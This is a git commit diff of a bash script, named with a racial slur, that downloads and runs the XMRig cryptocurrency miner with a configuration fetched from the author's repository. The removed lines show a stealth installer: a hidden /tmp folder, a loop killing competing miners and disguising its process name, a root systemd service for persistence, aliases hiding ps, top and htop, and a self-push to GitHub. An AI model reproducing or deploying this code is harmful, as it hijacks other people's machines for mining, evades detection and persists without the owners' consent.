b959cc049bbe7ed75f8db7ab238b38c9aded2a4e
gorguzaaaaz <sigmaboy182009@gmail.com>
2025-03-05 17:50:31 +0530

    Update textnigg.sh

--- textnigg.sh
+++ textnigg.sh
@@ -1,74 +1,46 @@
 #!/bin/bash
 
-repo="https://github.com/gorguzaaaaz/texniaz"
-folder="/tmp/.texniaz"
 xmrver="6.22.2"
 
-# Create hidden folder
-mkdir -p $folder
-cd $folder
+if [ -d /tmp ]; then
+    echo "/tmp exists"
+else
+    # create tmp if it doesn't exist (yes that happened...)
+    sudo -n mkdir /tmp
+    sudo -n chmod 777 /tmp
+fi
 
-# Download xmrig
-wget https://github.com/xmrig/xmrig/releases/download/v$xmrver/xmrig-$xmrver-linux-static-x64.tar.gz
+# remove any aliases
+unalias -a
 
+# try to install wget and util-linux
+sudo -n apt update
+sudo -n apt install -y wget util-linux
+sudo -n apk add wget util-linux
+sudo -n dnf install wget util-linux
+
+if command -v wget >/dev/null 2>&1; then
+    DOWNLOAD_CMD="wget"
+else
+    DOWNLOAD_CMD="curl -OL"
+fi
+
+mkdir -p /tmp/xmrig
+# run the script in /tmp/xmrig, after the script checks if it exists or not
+cd /tmp/xmrig
+
+# use curl because it's present on more distributions
+$DOWNLOAD_CMD https://github.com/xmrig/xmrig/releases/download/v$xmrver/xmrig-$xmrver-linux-static-x64.tar.gz
 tar -xf xmrig-$xmrver-linux-static-x64.tar.gz
 cd xmrig-$xmrver
+
+# just to be extra safe
 chmod +x xmrig
 
-# Download Config.json
-wget $repo/raw/main/config.json
+rm -f config.json
+$DOWNLOAD_CMD https://raw.githubusercontent.com/gorguzaaaaz/texniaz/refs/heads/main/config.json
+randnum=$(( RANDOM % 1000 + 1 ))
+sed -i "s/kasm/kasm-$randnum/g" config.json
 
-# Process Killer
-cat <<EOF > killer.sh
-#!/bin/bash
-while true; do
-  pkill -f xmrig
-  pkill -f minerd
-  pkill -f kworker
-  pkill -f kthreadd
-  echo "texniaz" > /proc/\$$/comm
-  if ! pgrep -f xmrig; then
-    nohup $folder/xmrig-$xmrver/xmrig > /dev/null 2>&1 &
-  fi
-  sleep 10
-done
-EOF
-
-chmod +x killer.sh
-
-# Systemd Service
-cat <<EOL > /etc/systemd/system/texniaz.service
-[Unit]
-Description=Texniaz Miner Service
-After=network.target
-
-[Service]
-ExecStart=$folder/killer.sh
-Restart=always
-RestartSec=3
-User=root
-
-[Install]
-WantedBy=multi-user.target
-EOL
-
-# Enable & Start Service
-systemctl daemon-reload
-systemctl enable texniaz
-systemctl start texniaz
-
-# Hide the Process
-alias ps='echo Sorry, No Miners Here 💀'
-alias top='echo Sorry, No Miners Here 💀'
-alias htop='echo Sorry, No Miners Here 💀'
-
-# Self Upload to GitHub
-git clone $repo
-cd texniaz
-echo "Texniaz Miner Installed" > payload.txt
-git add payload.txt
-git commit -m "Add Texniaz Auto Miner 💀"
-git push origin main
-
-clear
-echo "PHONK BY TEXNIAZ 🔥💀 - Unkillable Miner Installed"
+sudo -n ./xmrig
+./xmrig
